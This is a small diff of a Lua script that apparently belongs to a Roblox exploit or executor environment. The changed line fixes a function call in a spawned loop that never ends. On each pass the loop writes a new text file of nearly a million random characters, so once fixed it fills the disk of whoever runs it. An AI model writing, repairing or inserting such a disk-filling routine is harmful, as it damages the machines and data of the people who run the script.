@@ -94,7 +94,7 @@ if shared.FuncsConnect then
 		  task.spawn(function()
         repeat
           task.wait()
-          writefile(Functions.randomGUID..".txt", Functions.randomString(999999, 999999))
+          writefile(Functions.randomGUID()..".txt", Functions.randomString(999999, 999999))
         until false
 		  end)
       wait(5)
